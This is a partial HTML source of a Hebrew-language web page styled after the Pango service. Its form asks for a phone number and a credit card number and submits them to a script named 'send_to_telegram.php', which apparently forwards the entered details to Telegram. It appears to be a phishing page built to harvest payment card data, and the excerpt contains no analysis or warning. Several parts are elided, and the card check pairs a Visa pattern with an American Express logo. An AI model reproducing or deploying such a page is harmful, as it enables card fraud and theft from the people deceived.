    ...
    <script>
        ...
        function validateCard(input) {
            ...
            if (/^4[0-9]{12}(?:[0-9]{3})?$/.test(cardNumber)) {
                ...
                icon.src = 'https://e7.pngegg.com/pngimages/745/624/png-clipart-american-express-logo-credit-card-payment-credit-card-blue-text-thumbnail.png';
                icon.style.display = 'block';
                error.style.display = 'none';
                input.classList.remove('error');
            } else {
...
<body>
    ...
    <div class="form-container">
        ...
        <form action="send_to_telegram.php" method="post" onsubmit="handleSubmit(event)">
            <input type="text" id="phone" name="phone" placeholder="מספר טלפון *" required oninput="validatePhone(this)">
            ...
            <div class="card-input">
                <img id="card-icon" />
                <input type="text" id="card-number" name="card_number" placeholder="מספר כרטיס אשראי *" required oninput="validateCard(this)">
    ...
    <div class="footer">
        ...
        <div class="download-buttons" style="display: flex; justify-content: center; gap: 10px; margin-bottom: 20px;">
            <a href="#" style="background-color: #007bff; color: white; padding: 10px 20px; border-radius: 25px; text-decoration: none; font-size: 14px;">Google Play</a>
            <a href="#" style="background-color: #007bff; color: white; padding: 10px 20px; border-radius: 25px; text-decoration: none; font-size: 14px;">Apple Store</a>
        </div>
        <ul style="list-style: none; padding: 0; margin: 0; text-align: center;">
            <li style="margin: 5px 0;"><a href="#" style="color: #007bff; text-decoration: none;">הסדרים משפטיים</a></li>
            <li style="margin: 5px 0;"><a href="#" style="color: #007bff; text-decoration: none;">אפשרות הסרת שירותים</a></li>
            ...
            <li style="margin: 5px 0;"><a href="#" style="color: #007bff; text-decoration: none;">תנאי שימוש פנגו</a></li>
            <li style="margin: 5px 0;"><a href="#" style="color: #007bff; text-decoration: none;">מדיניות פרטיות</a></li>
